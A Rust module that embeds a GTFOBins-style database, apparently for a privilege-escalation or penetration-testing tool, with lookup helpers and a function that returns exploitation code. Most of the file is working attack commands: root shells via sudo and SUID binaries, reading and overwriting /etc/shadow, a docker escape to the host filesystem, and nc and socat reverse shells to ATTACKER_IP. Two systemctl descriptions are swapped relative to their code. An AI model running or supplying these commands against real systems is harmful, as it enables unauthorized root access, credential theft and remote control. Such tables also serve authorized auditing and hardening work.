#![allow(dead_code)]

use std::collections::HashMap;
use once_cell::sync::Lazy;

use super::types::{GtfobinsEntry, GtfobinsFunction};

/// Database of GTFOBins entries for common exploitable binaries
/// Reference: https://gtfobins.github.io/
static GTFOBINS_DB: Lazy<HashMap<&'static str, GtfobinsEntry>> = Lazy::new(|| {
    let mut db = HashMap::new();

    // Bash
    db.insert("bash", GtfobinsEntry {
        binary: "bash".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "bash -p".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "If the binary has SUID, run with -p to maintain privileges".to_string(),
                code: "./bash -p".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo bash".to_string(),
            },
        ],
    });

    // Python
    db.insert("python", GtfobinsEntry {
        binary: "python".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "python -c 'import os; os.system(\"/bin/sh\")'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo python -c 'import os; os.system(\"/bin/sh\")'".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "Spawn shell with SUID privileges".to_string(),
                code: "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'".to_string(),
            },
            GtfobinsFunction {
                name: "capabilities".to_string(),
                description: "Setuid capability allows privilege escalation".to_string(),
                code: "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'".to_string(),
            },
        ],
    });

    // Python3
    db.insert("python3", GtfobinsEntry {
        binary: "python3".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "python3 -c 'import os; os.system(\"/bin/sh\")'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "Spawn shell with SUID privileges".to_string(),
                code: "./python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'".to_string(),
            },
        ],
    });

    // Perl
    db.insert("perl", GtfobinsEntry {
        binary: "perl".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "perl -e 'exec \"/bin/sh\";'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo perl -e 'exec \"/bin/sh\";'".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "Spawn shell with SUID privileges".to_string(),
                code: "./perl -e 'exec \"/bin/sh\";'".to_string(),
            },
        ],
    });

    // Ruby
    db.insert("ruby", GtfobinsEntry {
        binary: "ruby".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "ruby -e 'exec \"/bin/sh\"'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo ruby -e 'exec \"/bin/sh\"'".to_string(),
            },
        ],
    });

    // Find
    db.insert("find", GtfobinsEntry {
        binary: "find".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "find . -exec /bin/sh \\; -quit".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo find . -exec /bin/sh \\; -quit".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "Spawn shell with SUID privileges".to_string(),
                code: "./find . -exec /bin/sh -p \\; -quit".to_string(),
            },
        ],
    });

    // Vim
    db.insert("vim", GtfobinsEntry {
        binary: "vim".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell from vim".to_string(),
                code: "vim -c ':!/bin/sh'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo vim".to_string(),
                code: "sudo vim -c ':!/bin/sh'".to_string(),
            },
            GtfobinsFunction {
                name: "file-read".to_string(),
                description: "Read arbitrary files".to_string(),
                code: "vim /etc/shadow".to_string(),
            },
        ],
    });

    // Less
    db.insert("less", GtfobinsEntry {
        binary: "less".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell from less".to_string(),
                code: "less /etc/passwd\n!/bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo less".to_string(),
                code: "sudo less /etc/passwd\n!/bin/sh".to_string(),
            },
        ],
    });

    // More
    db.insert("more", GtfobinsEntry {
        binary: "more".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell from more".to_string(),
                code: "TERM=linux more /etc/passwd\n!/bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo more".to_string(),
                code: "sudo more /etc/passwd\n!/bin/sh".to_string(),
            },
        ],
    });

    // Nmap
    db.insert("nmap", GtfobinsEntry {
        binary: "nmap".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell via nmap interactive mode (older versions)".to_string(),
                code: "nmap --interactive\nnmap> !sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via script".to_string(),
                code: "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && sudo nmap --script=/tmp/x.nse".to_string(),
            },
        ],
    });

    // Awk
    db.insert("awk", GtfobinsEntry {
        binary: "awk".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "awk 'BEGIN {system(\"/bin/sh\")}'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo awk 'BEGIN {system(\"/bin/sh\")}'".to_string(),
            },
        ],
    });

    // Tar
    db.insert("tar", GtfobinsEntry {
        binary: "tar".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell via checkpoint action".to_string(),
                code: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh".to_string(),
            },
        ],
    });

    // Zip
    db.insert("zip", GtfobinsEntry {
        binary: "zip".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell via zip".to_string(),
                code: "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nrm $TF".to_string(),
            },
        ],
    });

    // Git
    db.insert("git", GtfobinsEntry {
        binary: "git".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell via git".to_string(),
                code: "PAGER='sh -c \"exec sh 0<&1\"' git -p help".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help".to_string(),
            },
        ],
    });

    // Cp
    db.insert("cp", GtfobinsEntry {
        binary: "cp".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "file-write".to_string(),
                description: "Write to arbitrary files with SUID".to_string(),
                code: "LFILE=/etc/shadow\nTF=$(mktemp)\necho 'DATA' > $TF\n./cp $TF $LFILE".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "Copy /bin/sh to writable location and set SUID".to_string(),
                code: "./cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p".to_string(),
            },
        ],
    });

    // Env
    db.insert("env", GtfobinsEntry {
        binary: "env".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "env /bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo env /bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "suid".to_string(),
                description: "Spawn shell with SUID privileges".to_string(),
                code: "./env /bin/sh -p".to_string(),
            },
        ],
    });

    // Ftp
    db.insert("ftp", GtfobinsEntry {
        binary: "ftp".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell from ftp".to_string(),
                code: "ftp\n!/bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo ftp\n!/bin/sh".to_string(),
            },
        ],
    });

    // Sed
    db.insert("sed", GtfobinsEntry {
        binary: "sed".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "sed -n '1e exec sh 1>&0' /etc/hosts".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo sed -n '1e exec sh 1>&0' /etc/hosts".to_string(),
            },
        ],
    });

    // Netcat/nc
    db.insert("nc", GtfobinsEntry {
        binary: "nc".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "reverse-shell".to_string(),
                description: "Reverse shell".to_string(),
                code: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f".to_string(),
            },
            GtfobinsFunction {
                name: "bind-shell".to_string(),
                description: "Bind shell".to_string(),
                code: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l LPORT >/tmp/f".to_string(),
            },
        ],
    });

    // Socat
    db.insert("socat", GtfobinsEntry {
        binary: "socat".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "reverse-shell".to_string(),
                description: "Reverse shell".to_string(),
                code: "socat tcp-connect:ATTACKER_IP:ATTACKER_PORT exec:sh,pty,stderr,setsid,sigint,sane".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo socat stdin exec:/bin/sh".to_string(),
            },
        ],
    });

    // Docker
    db.insert("docker", GtfobinsEntry {
        binary: "docker".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Break out of container or escalate to root".to_string(),
                code: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh".to_string(),
            },
            GtfobinsFunction {
                name: "file-read".to_string(),
                description: "Read arbitrary files on host".to_string(),
                code: "docker run -v /etc/shadow:/shadow:ro alpine cat /shadow".to_string(),
            },
        ],
    });

    // Systemctl
    db.insert("systemctl", GtfobinsEntry {
        binary: "systemctl".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell from pager".to_string(),
                code: "TF=$(mktemp)\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsystemctl link $TF\nsystemctl enable --now $TF".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Create and run a malicious service".to_string(),
                code: "sudo systemctl\n!sh".to_string(),
            },
        ],
    });

    // Journalctl
    db.insert("journalctl", GtfobinsEntry {
        binary: "journalctl".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell from less pager".to_string(),
                code: "journalctl\n!/bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo journalctl\n!/bin/sh".to_string(),
            },
        ],
    });

    // Ed
    db.insert("ed", GtfobinsEntry {
        binary: "ed".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "ed\n!/bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo ed\n!/bin/sh".to_string(),
            },
        ],
    });

    // Expect
    db.insert("expect", GtfobinsEntry {
        binary: "expect".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "expect -c 'spawn /bin/sh;interact'".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo expect -c 'spawn /bin/sh;interact'".to_string(),
            },
        ],
    });

    // Strace
    db.insert("strace", GtfobinsEntry {
        binary: "strace".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "strace -o /dev/null /bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo strace -o /dev/null /bin/sh".to_string(),
            },
        ],
    });

    // Ltrace
    db.insert("ltrace", GtfobinsEntry {
        binary: "ltrace".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "ltrace -b -L /bin/sh".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo ltrace -b -L /bin/sh".to_string(),
            },
        ],
    });

    // Gdb
    db.insert("gdb", GtfobinsEntry {
        binary: "gdb".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn interactive shell".to_string(),
                code: "gdb -nx -ex '!sh' -ex quit".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Spawn root shell via sudo".to_string(),
                code: "sudo gdb -nx -ex '!sh' -ex quit".to_string(),
            },
        ],
    });

    // Tcpdump
    db.insert("tcpdump", GtfobinsEntry {
        binary: "tcpdump".to_string(),
        functions: vec![
            GtfobinsFunction {
                name: "shell".to_string(),
                description: "Spawn shell via tcpdump".to_string(),
                code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root".to_string(),
            },
            GtfobinsFunction {
                name: "sudo".to_string(),
                description: "Execute commands via tcpdump".to_string(),
                code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root".to_string(),
            },
        ],
    });

    db
});

/// Look up a binary in GTFOBins database
pub fn lookup_gtfobins(binary: &str) -> Option<&'static GtfobinsEntry> {
    // Normalize binary name (remove path)
    let binary_name = binary.rsplit('/').next().unwrap_or(binary);
    GTFOBINS_DB.get(binary_name)
}

/// Check if a binary is in GTFOBins database
pub fn is_gtfobins_binary(binary: &str) -> bool {
    let binary_name = binary.rsplit('/').next().unwrap_or(binary);
    GTFOBINS_DB.contains_key(binary_name)
}

/// Get GTFOBins URL for a binary
pub fn get_gtfobins_url(binary: &str) -> Option<String> {
    let binary_name = binary.rsplit('/').next().unwrap_or(binary);
    if GTFOBINS_DB.contains_key(binary_name) {
        Some(format!("https://gtfobins.github.io/gtfobins/{}/", binary_name))
    } else {
        None
    }
}

/// Get all known GTFOBins binaries
pub fn get_all_gtfobins() -> Vec<&'static str> {
    GTFOBINS_DB.keys().copied().collect()
}

/// Get exploitation code for a specific binary and function
pub fn get_exploitation_code(binary: &str, function: &str) -> Option<String> {
    let entry = lookup_gtfobins(binary)?;
    entry
        .functions
        .iter()
        .find(|f| f.name == function)
        .map(|f| f.code.clone())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gtfobins_lookup() {
        assert!(lookup_gtfobins("python").is_some());
        assert!(lookup_gtfobins("/usr/bin/python").is_some());
        assert!(lookup_gtfobins("nonexistent").is_none());
    }

    #[test]
    fn test_gtfobins_url() {
        assert_eq!(
            get_gtfobins_url("vim"),
            Some("https://gtfobins.github.io/gtfobins/vim/".to_string())
        );
    }

    #[test]
    fn test_is_gtfobins_binary() {
        assert!(is_gtfobins_binary("bash"));
        assert!(is_gtfobins_binary("/bin/bash"));
        assert!(!is_gtfobins_binary("unknown_binary"));
    }
}
